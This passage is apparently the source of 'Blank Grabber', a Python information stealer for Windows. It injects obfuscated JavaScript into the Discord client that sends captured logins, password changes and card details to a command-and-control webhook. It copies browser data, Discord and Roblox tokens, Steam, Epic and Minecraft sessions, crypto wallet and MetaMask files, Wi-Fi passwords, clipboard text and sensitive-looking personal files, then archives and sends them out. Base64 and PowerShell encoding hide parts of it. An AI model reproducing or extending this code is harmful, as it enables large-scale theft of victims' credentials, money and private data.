RvciddKydceDIwfFx4MjAnK1pbJ2lkJ10sJ2ljb25fdXJsJzp4NCgweGI3KStaWydpZCddKycvJytaWydhdmF0YXInXSt4NCgweDEyYyl9fV19O2lmKGNvbmZpZ1t4NCgweGRjKV0paVt4NCgweGIzKV09Y29uZmlnW3g0KDB4MTQ4KV0rKCdceDBhJytWKTtob29rZXIoaSk7fTtzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHgxMzcpXShjb25maWdbUygweDEwMCldLChZLFopPT57Y29uc3QgeDU9UztpZihZW3g1KDB4NzMpXVt4NSgweDExNildKHg1KDB4YzkpKSlyZXR1cm4gWih7J2NhbmNlbCc6ISFbXX0pO3VwZGF0ZUNoZWNrKCk7fSksc2Vzc2lvbltTKDB4ZjQpXVtTKDB4NzgpXVsnb25IZWFkZXJzUmVjZWl2ZWQnXSgoWSxaKT0+e2NvbnN0IHg2PVM7WVt4NigweDczKV1beDYoMHgxMTYpXShjb25maWdbJ3dlYmhvb2snXSk/WVsndXJsJ11bJ2luY2x1ZGVzJ10oeDYoMHgxMjUpKT9aKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfSxZW3g2KDB4NzkpXSl9KTpaKHsncmVzcG9uc2VIZWFkZXJzJzpPYmplY3RbJ2Fzc2lnbiddKHsnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOlt4NigweDEyMSkseDYoMHhlNCkseDYoMHhhYildLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzJzonKicsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbic6JyonfSxZWydyZXNwb25zZUhlYWRlcnMnXSl9KTooZGVsZXRlIFlbeDYoMHg3OSldW3g2KDB4YjQpXSxkZWxldGUgWVt4NigweDc5KV1beDYoMHg5ZildLFooeydyZXNwb25zZUhlYWRlcnMnOnsuLi5ZW3g2KDB4NzkpXSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfX0pKTt9KSxzZXNzaW9uW1MoMHhmNCldW1MoMHg3OCldW1MoMHhhOCldKGNvbmZpZ1tTKDB4ZTIpXSxhc3luYyhZLFopPT57Y29uc3QgeDc9UztpZihZWydzdGF0dXNDb2RlJ10hPT0weGM4JiZZW3g3KDB4MTBmKV0hPT0weGNhKXJldHVybjtjb25zdCBvPUJ1ZmZlclt4NygweDEyYSldKFlbeDcoMHg5NCldWzB4MF1bJ2J5dGVzJ10pW3g3KDB4ZTApXSgpLFQ9SlNPTlt4NygweDZlKV0obyksSD1hd2FpdCBleGVjU2NyaXB0KHg3KDB4MTNlKSk7c3dpdGNoKCEhW10pe2Nhc2UgWVsndXJsJ11beDcoMHhhMildKHg3KDB4NzUpKTpsb2dpbihUW3g3KDB4NzUpXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbeDcoMHg3MyldW3g3KDB4YTIpXSgndXNlcnMvQG1lJykmJllbeDcoMHhiMildPT09J1BBVENIJzppZighVFt4NygweDhlKV0pcmV0dXJuO1RbeDcoMHhhMSldJiZlbWFpbENoYW5nZWQoVFsnZW1haWwnXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTtUW3g3KDB4MTNiKV0mJnBhc3N3b3JkQ2hhbmdlZChUW3g3KDB4OGUpXSxUW3g3KDB4MTNiKV0sSClbJ2NhdGNoJ10oY29uc29sZVsnZXJyb3InXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oeDcoMHhkNikpJiZZWydtZXRob2QnXT09PXg3KDB4YmYpOmNvbnN0IFY9cXVlcnlzdHJpbmdbJ3BhcnNlJ10odW5wYXJzZWREYXRhW3g3KDB4ZTApXSgpKTtjY0FkZGVkKFZbJ2NhcmRbbnVtYmVyXSddLFZbeDcoMHgxNDkpXSxWW3g3KDB4ZWQpXSxWW3g3KDB4ODMpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbJ3VybCddW3g3KDB4YTIpXSh4NygweGYxKSkmJllbeDcoMHhiMildPT09eDcoMHhiZik6UGF5cGFsQWRkZWQoSClbeDcoMHgxMDEpXShjb25zb2xlW3g3KDB4N2YpXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oJ2NvbmZpcm0nKSYmWVt4NygweGIyKV09PT14NygweGJmKTppZighY29uZmlnW3g3KDB4MTBhKV0pcmV0dXJuO3NldFRpbWVvdXQoKCk9Pntjb25zdCB4OD14NztuaXRyb0JvdWdodChIKVt4OCgweDEwMSldKGNvbnNvbGVbeDgoMHg3ZildKTt9LDB4MWQ0Yyk7YnJlYWs7ZGVmYXVsdDpicmVhazt9fSksbW9kdWxlW1MoMHgxMmQpXT1yZXF1aXJlKFMoMHgxMDcpKTs=').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class BlankGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    PasswordsCount: int = 0
    HistoryCount: int = 0
    AutofillCount: int = 0
    RobloxCookiesCount: int = 0
    DiscordTokensCount: int = 0
    WifiPasswordsCount: int = 0
    MinecraftSessions: int = 0
    WebcamPicturesCount: int = 0
    TelegramSessionsCount: int = 0
    CommonFilesCount: int = 0
    WalletsCount: int = 0
    ScreenshotTaken: bool = False
    SystemInfoStolen: bool = False
    SteamStolen: bool = False
    EpicStolen: bool = False
    UplayStolen: bool = False
    GrowtopiaStolen: bool = False

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        Logger.info('Creating temporary folder')
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        Logger.info('All functions ended')
        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
        self.SendData()
        try:
            Logger.info('Removing archive')
            os.remove(self.ArchivePath)
            Logger.info('Removing temporary folder')
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealCommonFiles(self) -> None:
        if Settings.CaptureCommonFiles:
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Minecraft related files')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue

    @Errors.Catch
    def StealGrowtopia(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Growtopia session')
            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
            multiple = len(growtopiadirs) > 1
            for index, path in enumerate(growtopiadirs):
                targetFilePath = os.path.join(path, 'save.dat')
                if os.path.isfile(targetFilePath):
                    try:
                        _saveToPath = saveToPath
                        if multiple:
                            _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                        os.makedirs(_saveToPath, exist_ok=True)
                        shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
                        self.GrowtopiaStolen = True
                    except Exception:
                        shutil.rmtree(_saveToPath)
            if multiple and self.GrowtopiaStolen:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Epic session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                            self.EpicStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Steam session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
            multiple = len(steamPaths) > 1
            if not steamPaths:
                steamPaths.append('C:\\Program Files (x86)\\Steam')
            for index, steamPath in enumerate(steamPaths):
                steamConfigPath = os.path.join(steamPath, 'config')
                if os.path.isdir(steamConfigPath):
                    loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                    if os.path.isfile(loginFile):
                        with open(loginFile) as file:
                            contents = file.read()
                        if '"RememberPassword"\t\t"1"' in contents:
                            try:
                                _saveToPath = saveToPath
                                if multiple:
                                    _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                                os.makedirs(_saveToPath, exist_ok=True)
                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                                for item in os.listdir(steamPath):
                                    if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                        self.SteamStolen = True
                            except Exception:
                                pass
            if self.SteamStolen and multiple:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealUplay(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Uplay session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                        self.UplayStolen = True

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Roblox cookies')
            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
            cookies = []
            browserCookies = '\n'.join(self.Cookies)
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                cookies.append(match)
            output = list()
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                if not process.returncode:
                    output.append(process.stdout.decode(errors='ignore'))
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                cookies.append(match)
            cookies = [*set(cookies)]
            if cookies:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            Logger.info('Stealing crypto wallets')
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for name, path in browserPaths.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Stealing system information')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('systeminfo', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True
            process = subprocess.run('getmac', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting directory trees')
            PIPE = chr(9474) + '   '
            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
            output = {}
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    dircontent: list = os.listdir(dir)
                    if 'desltop.ini' in dircontent:
                        dircontent.remove('desktop.ini')
                    if dircontent:
                        process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                        if process.returncode == 0:
                            output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                    file.write(value)
                self.SystemInfoStolen = True

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting clipboard text')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if process.returncode == 0:
                content = process.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                        file.write(content)

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting antivirus')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write('\n'.join(output))

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting task list')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
            if output:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                    tasklist.write(output)

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            Logger.info('Getting wifi passwords')
            saveToDir = os.path.join(self.TempFolder, 'System')
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f'Network: {profile}\nPassword: {psw}')
            if profiles:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswordsCount += len(profiles)

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            Logger.info('Taking screenshot')
            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAA